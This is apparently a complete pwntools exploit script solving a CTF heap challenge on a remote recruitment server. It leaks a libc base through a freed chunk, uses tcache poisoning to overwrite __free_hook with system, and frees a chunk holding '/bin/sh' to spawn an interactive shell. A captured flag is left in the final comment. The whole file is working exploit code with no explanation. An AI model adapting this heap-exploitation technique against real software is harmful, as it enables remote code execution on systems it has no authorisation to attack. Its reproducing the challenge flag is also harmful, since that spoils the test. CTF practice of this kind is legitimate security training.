from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h']

# p = gdb.debug('./chal', '''
#     b *(main+75)
#     b *(main+87)
#     b *(main+99)
#     b *(main+111)
#     continue
# ''')

p = remote('recruit.osiris.bar', 21005)

def add(idx, size):
    p.sendlineafter(b'> \n', b'1')
    p.sendlineafter(b'> \n', str(idx).encode())
    p.sendlineafter(b'> \n', str(size).encode())

def edit(idx, data):
    p.sendlineafter(b'> \n', b'2')
    p.sendlineafter(b'> \n', str(idx).encode())
    p.send(data)

def show(idx):
    p.sendlineafter(b'> \n', b'3')
    p.sendlineafter(b'> \n', str(idx).encode())
    data = p.recvline()
    return data

def delete(idx):
    p.sendlineafter(b'> \n', b'4')
    p.sendlineafter(b'> \n', str(idx).encode())

# Stage 1: Leak libc address
add(0, 0x410)
add(1, 0x8)
delete(0)
glibc_base_addr = (u64(show(0)[0:6].ljust(8, b'\x00'))&~0xfff) - 0x1ec000
log.info(f'glibc_base_addr: {hex(glibc_base_addr)}')

# Stage 2: Calculate required addresses
glibc_e = ELF("libc.so.6")
glibc_free_hook_addr = glibc_base_addr + glibc_e.symbols.__free_hook
glibc_system_addr = glibc_base_addr + glibc_e.symbols.system

# Stage 3: Prepare for tcache poisoning
add(2, 0x410)
add(3, 0x8)
delete(1)
delete(3)

# Stage 4: Perform tcache poisoning
edit(3, p64(glibc_free_hook_addr))
add(4, 0x8)
edit(4, b'/bin/sh\x00')
add(5, 0x8)
edit(5, p64(glibc_system_addr))

# Stage 5: Trigger system('/bin/sh')
delete(4)

p.interactive()

# flag{c92828b32cc9494689ccf4bde219dccbda5c561e6d7931105443d08ec28aaacd}
